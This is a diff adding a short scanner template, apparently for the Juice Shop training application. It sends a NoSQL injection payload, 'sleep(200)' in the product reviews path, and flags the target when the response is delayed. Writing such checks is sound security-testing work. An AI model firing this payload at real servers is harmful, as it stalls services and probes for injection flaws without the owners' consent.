@@ -1,0 +1,23 @@
+id: juice-shop-nosql-dos
+
+info:
+  name: NoSQL DoS
+  author: yelaco
+  severity: high
+  tags: juice-shop,nosqli,delay
+  description: Let the server sleep for some time
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/products/sleep(200)/reviews"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 2
+
+    extractors:
+      - type: dsl
+        dsl:
+          - "duration"
